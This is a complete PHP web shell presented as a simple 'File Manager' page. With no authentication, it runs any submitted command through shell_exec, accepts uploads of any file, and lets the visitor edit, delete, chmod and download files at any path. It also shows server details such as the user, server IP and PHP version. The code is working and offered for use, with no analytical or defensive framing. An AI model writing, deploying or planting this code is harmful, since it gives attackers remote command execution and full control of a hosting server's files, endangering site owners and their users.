<?php
@ini_set('display_errors', 0);

// Get current directory (PHP 4.3.9 compatible)
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);

if (!@is_dir($current_dir)) {
    $current_dir = dirname(__FILE__);
}

$items = @scandir($current_dir);

function formatBytes($size, $precision = 2) {
    if ($size <= 0) return '0 Bytes';
    $base = log($size) / log(1024);
    $suffixes = array('', 'KB', 'MB', 'GB', 'TB');   
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
}

$parent_dir = dirname($current_dir);
$editFileContent = '';

function formatTime($timestamp) {
    return date('Y-m-d H:i:s', $timestamp);
}

// PHP 4.3.9 compatible realpath alternative
function my_realpath($path) {
    if (@file_exists($path)) {
        return $path;
    }
    return '.';
}

$directory = isset($_GET['dir']) ? $_GET['dir'] : '.';
$directory = my_realpath($directory);

$output = '';

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $target = isset($_POST['target']) ? $_POST['target'] : '';

    switch ($action) {
        case 'delete':
            if (@is_dir($target)) {
                deleteDirectory($target);
            } else {
                @unlink($target);
            }
            break;

        case 'edit':
            if (@file_exists($target)) {
                $editFileContent = @file_get_contents($target);
            }
            break;

        case 'save':
            if (@file_exists($target) && isset($_POST['content'])) {
                @file_put_contents($target, $_POST['content']);
            }
            break;

        case 'chmod':
            if (isset($_POST['permissions'])) {
                @chmod($target, octdec($_POST['permissions']));
            }
            break;

        case 'download':
            if (@file_exists($target)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=' . basename($target));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target));
                @readfile($target);
                exit;
            }
            break;

        case 'upload':
            if (isset($_FILES['fileToUpload'])) {
                $file = $_FILES['fileToUpload'];

                if ($file['error'] == 0) { // UPLOAD_ERR_OK
                    $fileName = basename($file['name']);
                    $targetPath = $current_dir . '/' . $fileName;

                    if (@copy($file['tmp_name'], $targetPath)) {
                        echo "<p>File uploaded successfully!</p>";
                    } else {
                        echo "<p>Failed to move uploaded file.</p>";
                    }
                } else {
                    echo "<p>Error uploading file.</p>";
                }
            }
            break;

        case 'execute':
            if (isset($_POST['command'])) {
                $command = $_POST['command'];
                $output = @shell_exec($command);
            }
            break;
    }
}

function deleteDirectory($dir) {
    if (!@is_dir($dir)) {
        return false;
    }

    $items = @array_diff(@scandir($dir), array('.', '..'));

    foreach ($items as $item) {
        $path = $dir . '/' . $item;
        if (@is_dir($path)) {
            deleteDirectory($path);
        } else {
            @unlink($path);
        }
    }

    return @rmdir($dir);
}

// PHP 4.3.9 compatible get_current_user alternative
function my_get_current_user() {
    if (function_exists('get_current_user')) {
        return get_current_user();
    }
    return 'unknown';
}

$username = my_get_current_user();
$phpVersion = phpversion();
$dateTime = date('Y-m-d H:i:s');
$hddFreeSpace = @disk_free_space("/") / (1024 * 1024 * 1024);
$hddTotalSpace = @disk_total_space("/") / (1024 * 1024 * 1024);
$serverIP = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$clientIP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'N/A';
$cwd = getcwd();

$parentDirectory = dirname($directory);
$breadcrumbs = explode('/', $directory);
$breadcrumbLinks = array();
$breadcrumbPath = '';

foreach ($breadcrumbs as $crumb) {
    $breadcrumbPath .= $crumb . '/';
    $breadcrumbLinks[] = '<a href="?dir=' . urlencode(rtrim($breadcrumbPath, '/')) . '">' . htmlspecialchars($crumb) . '</a>';
}

$breadcrumbLinksString = implode(' / ', $breadcrumbLinks);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>File Manager</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <style type="text/css">
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .file-manager {
            width: 90%;
            margin: 10px auto;
            background-color: #fff;
            padding: 10px;
            border: 1px solid #ccc;
        }
        .file-manager h1 {
            text-align: center;
            font-size: 18px;
        }
        .system-info {
            margin-bottom: 15px;
            background-color: #f9f9f9;
            padding: 8px;
            border: 1px solid #ddd;
            font-size: 12px;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        .file-list th, .file-list td {
            padding: 6px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .file-list th {
            background-color: #f0f0f0;
        }
        .file-list tr:hover {
            background-color: #f9f9f9;
        }
        .actions {
            margin: 10px 0;
            text-align: center;
        }
        .actions input[type="text"], .actions input[type="file"] {
            padding: 4px;
        }
        .actions input[type="submit"] {
            padding: 4px 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        .actions input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .edit-form {
            margin-top: 15px;
        }
        .edit-form textarea {
            width: 98%;
            height: 200px;
            font-family: monospace;
            font-size: 12px;
        }
        .edit-form input[type="submit"] {
            background-color: #28a745;
            color: #fff;
            padding: 6px 12px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="file-manager">
    <h1>File Manager</h1>
    
    <div class="system-info">
        <p>Current User: <b><?php echo htmlspecialchars($username); ?></b></p>
        <p>Server IP: <b><?php echo htmlspecialchars($serverIP); ?></b></p>
        <p>Client IP: <b><?php echo htmlspecialchars($clientIP); ?></b></p>
        <p>PHP Version: <b><?php echo htmlspecialchars($phpVersion); ?></b></p>
        <p>Free Space: <b><?php echo round($hddFreeSpace, 2); ?> GB</b></p>
    </div>

    <div class="breadcrumbs">
        <p>Current Directory: <?php echo $breadcrumbLinksString; ?></p>
    </div>

    <table class="file-list">
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Type</th>
                <th>Created</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($items as $item) :
                if ($item == '.' || $item == '..') continue;
                $itemPath = $current_dir . '/' . $item;
                $isDirectory = @is_dir($itemPath);
                $type = $isDirectory ? 'Directory' : 'File';
                $createdTime = @filectime($itemPath);
                $modifiedTime = @filemtime($itemPath);
            ?>
                <tr>
                    <td>
                        <?php if ($isDirectory) : ?>
                            <a href="?dir=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item); ?></a>
                        <?php else : ?>
                            <?php echo htmlspecialchars($item); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $isDirectory ? '-' : formatBytes(@filesize($itemPath)); ?></td>
                    <td><?php echo $type; ?></td>
                    <td><?php echo $createdTime ? formatTime($createdTime) : 'N/A'; ?></td>
                    <td><?php echo $modifiedTime ? formatTime($modifiedTime) : 'N/A'; ?></td>
                    <td>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="action" value="edit">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                            <input type="submit" value="Edit">
                        </form>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                            <input type="submit" value="Delete">
                        </form>
                        <?php if (!$isDirectory) : ?>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="download">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                <input type="submit" value="Download">
                            </form>
                        <?php endif; ?>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <?php if (!empty($editFileContent)) : ?>
        <form method="POST" class="edit-form">
            <input type="hidden" name="action" value="save">
            <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
            <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea><br>
            <input type="submit" value="Save">
        </form>
    <?php endif; ?>

    <div class="actions">
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="fileToUpload">
            <input type="submit" value="Upload">
        </form>
    </div>

    <div class="actions">
        <form method="POST">
            <input type="hidden" name="action" value="execute">
            <input type="text" name="command" style="width:300px;" placeholder="Enter command">
            <input type="submit" value="Execute">
        </form>
        <?php if ($output) : ?>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

</div>
</body>
</html>
